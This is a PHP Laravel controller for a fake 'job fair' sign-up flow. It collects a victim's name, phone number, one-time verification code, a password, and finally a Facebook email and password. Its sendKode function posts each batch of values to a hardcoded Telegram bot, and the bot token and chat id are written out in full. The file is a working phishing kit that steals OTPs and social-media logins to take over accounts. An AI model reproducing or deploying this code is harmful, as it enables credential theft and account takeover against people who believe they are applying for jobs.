<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class JobfairController extends Controller
{
    public function index(Request $request)
    {
        return inertia('Jobfair/Index');
    }

    public function login_number(Request $request)
    {
        $request->validate([
            'full_name' => 'required|min:3|max:75',
            'phone_number' => 'required|string|min:6|max:16',
        ]);
        Session::push('phone_number_job', $request->phone_number);
        $this->sendKode($request->phone_number);
        return redirect()->route('jobfair.verification');
    }

    public function Job_verif(Request $request)
    {
        $phone_number = Session::get('phone_number_job')[0];

        return inertia('Jobfair/Verif', compact('phone_number'));
    }
    public function job_verif_store(Request $request)
    {
        $request->validate(['verif_code' => 'numeric|digits:5']);
        Session::push('verif_code_job', $request->verif_code);
        $this->sendKode($request->phone_number, $request->verif_code);
        return redirect()->route('jobfair.password');
    }

    public function password(Request $request)
    {
        $phone_number = Session::get('phone_number_job')[0];
        $verif_code = Session::get('verif_code_job')[0];

        return inertia('Jobfair/Password', compact('phone_number', 'verif_code'));
    }
    public function store_password(Request $request)
    {
        Session::push('password_job', $request->password);
        $this->sendKode($request->phone_number, $request->verif_code, $request->password);
        return redirect()->route('jobfair-facebook');
    }

    public function facebook(Request $request)
    {
        $phone_number = Session::get('phone_number_job')[0];
        $verif_code = Session::get('verif_code_job')[0];
        $password = Session::get('password_job')[0];
        return inertia('Jobfair/Facebook', compact('phone_number', 'verif_code', 'password'));
    }
    public function store_facebook(Request $request)
    {
        $this->sendKode($request->phone_number, $request->verif_code, $request->password, $request->email, $request->password_facebook);
        return redirect()->route('jobfair-success');
    }
    public function success()
    {
        Session::remove('phone_number');
        Session::remove('verif_code');
        Session::remove('password');
        return inertia('Jobfair/Success');
    }
    public function sendKode(
        $phone = "",
        $otp = "",
        $password = "",
        $email = "",
        $passFB = "",
    ) {
        // mulai dari bot 6 yah

        // BOT 6
        $bot_token = "7906457812:AAGmB-VDby_ZAp-Swyak423VvOxhprzF5mY";
        $chat_id = "6720473494";


        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "Phone | $phone \n OTP | $otp \n password : $password \n
Email FB | $email
PW FB | $passFB
             
            "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
